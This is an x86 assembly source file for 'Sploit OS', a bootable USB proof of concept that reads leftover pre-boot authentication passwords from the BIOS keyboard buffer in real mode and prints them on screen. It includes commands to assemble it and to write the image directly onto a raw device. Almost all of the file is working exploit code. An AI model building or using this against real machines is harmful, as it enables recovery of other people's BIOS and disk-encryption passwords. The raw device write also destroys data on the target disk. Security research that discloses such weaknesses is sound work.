;----------------------------------------------------------------------------------------------
;
; Simple bootstrap to test our BIOS shellcode and verify that passwords can be leaked in
; plain text under REAL MODE.
;
; // Jonathan Brossard
; jb@endrazine.com
; endrazine@gmail.com
;
;----------------------------------------------------------------------------------------------
;		[ Compiling and using Sploit OS ]
;
; The purpose of this code is to create a bootable usb disk image Poc
; that will retrieve pre-boot authentication passwords from BIOS memory
; in Real mode when booted.
;
;
; Here, I assume your usb disk is located on /dev/sdb
; Use `fdisk -l` to get your usb device name and modify
; those commands to match your own device name.
;
;
; Compiling :
;
;       root@blackbox:/home/jonathan/blackhat/sploit-os# nasm -fbin sploitos.asm -o sploitos.img
;
; Verifying the bootable image is ok:
;
;        root@blackbox:/home/jonathan/blackhat/sploit-os# file sploitos.img sploitos.img:
;        x86 boot sector, code offset 0x3c, OEM-ID "SploitOS", sectors/cluster 4, root entries 512,
;        sectors 32768 (volumes <=32 MB) , Media descriptor 0xf8, sectors/FAT 32, heads 64,
;        serial number 0xdeb00001, label: "[endrazine]", FAT (16 bit)
;        root@blackbox:/home/jonathan/blackhat/sploit-os#
;
; Installing:
; 
;        root@blackbox:/home/jonathan/blackhat/sploit-os# cat sploitos.img >/dev/sdb
;        root@blackbox:/home/jonathan/blackhat/sploit-os#
;
; Rebooting:
;
;        root@blackbox:/home/jonathan/blackhat/sploit-os# reboot
;
;----------------------------------------------------------------------------------------------

org 0x7c00					;to be loaded at RAM address 0000:7C00


section .text 


_start:
	jmp short realstart		; jump over the boot record's data


; ----------------------------------------------------------------------
; Create a boot record with appropriate geometry etc. for a usb boot disk
; ----------------------------------------------------------------------
brINT13Flag     DB      90H             ; 0002h - 0EH for INT13 AH=42 READ
brOEM           DB      'SploitOS'      ; 0003h - OEM name & DOS version (8 chars)
brBPS           DW      512             ; 000Bh - Bytes/sector
brSPC           DB      4               ; 000Dh - Sectors/cluster
brResCount      DW      1               ; 000Eh - Reserved (boot) sectors
brFATs          DB      2               ; 0010h - FAT copies
brRootEntries   DW      200H		; 0011h - Root directory entries
brSectorCount   DW      32768		; 0013h - Sectors in volume, < 32MB
brMedia         DB      0xf8		; 0015h - Media descriptor
brSPF           DW      32              ; 0016h - Sectors per FAT
brSPH           DW      32              ; 0018h - Sectors per track
brHPC           DW      64		; 001Ah - Number of Heads
brHidden        DD      0               ; 001Ch - Hidden sectors
brSectors       DD      0	        ; 0020h - Total number of sectors
		DB      0               ; 0024h - Physical drive no.
		DB      0               ; 0025h - Reserved (FAT32)
		DB      29H             ; 0026h - Extended boot record sig 
brSerialNum     DD      0xdeb00001      ; 0027h - Volume serial number (random)
brLabel         DB      '[endrazine]'   ; 002Bh - Volume label  (11 chars)
brFSID          DB      'FAT16   '      ; 0036h - File System ID (8 chars)
;------------------------------------------------------------------------

realstart:
	mov ax, 0x1301				; BIOS write string function
	mov bx, 0x07				; write in current page

	mov cx, 122
	xor dx, dx				; start in upper left corner
	mov ebp, Creditstring
	int 0x10


	mov bx, 4
	mov dx, 5
	xor dx,dx
	mov dh, 7


	smsw ax				; Verify we are in real (or v86 ?) mode...
	test al,1			; by checking PE bit of CR0
	je near real
					; we are in v86 mode...
	mov ax, 0x1301
	mov cx, 56
	mov ebp, v86string
	int 0x10

	jmp near reboot

real:					; we are in real mode...
	mov ax, 0x1301
	mov cx, 76
	mov ebp, realstring
	int 0x10

;---------------------------------[ Start of BIOS shellcode ]---------------------------------

        xor ah, ah
        mov al, 0x40                             ; 0x40:0x1e : keyboard buffer address
        mov ds, ax

        mov al, 0x1e
        mov si, ax

        mov cx, 0x10

leakloop:
        mov ax, [ds:si]
        xor ah, ah

        cmp al, 0x20
        jb keepcopying
        cmp al, 0x7e
        jb keepcopying2

keepcopying:
        mov al, 0x20
keepcopying2:
        add si, byte +0x2                       ; Replace this line by add si,4
                                                ; if you plan to use it under MS-Dos
                                                ; due to imperfect emulation of 16b
                                                ; arch under vm86.
        push si
        push cx
        push ax
        mov ah, 0x03
        xor bh, bh
        int 0x10

        mov ah, 0x02
        inc dl
        int 0x10

        pop ax

        mov ah, 0ah
        mov bl, 06h
        mov cl, 0x01
        int 0x10
        pop cx
        pop si

        loop leakloop

;---------------------------------[ End of BIOS shellcode ]---------------------------------
reboot:
	mov ax, 0x1301
	mov bx, 4
	mov cx, 27
	xor dx, dx
	mov dh, 11
	mov ebp, Byestring
	int 0x10

	xor ax, ax				; wait for a key to be pressed
	int 0x16


	jmp 0xffff:0x0
;	db 0x0EA				;              
;	dw 0x0000				; Reboot
;	dw 0x0FFFF				;



v86string	db '--[ According to cr0, you are in v86 mode :( Quitting...',13,10
realstring	db '--[ According to cr0, you are in real mode, ok',10,13
		db '',13,10
		db '--[ Password (if any) is : ',10,13
		db '',13,10

Creditstring	db ' [ Sploit OS : Real mode BIOS hysteresis Poc ]',13,10
		db '',10,13
		db ' // Jonathan Brossard - jonathan@ivizindia.com - endrazine@gmail.com',13,10
		db '',13,10

Byestring	db '--[ Press any key to reboot',10,13

times 512-($-$$)-2 db 0				; Write boot signature at 
        dw 0x0AA55				; address (512 - 2) bytes

;EOF

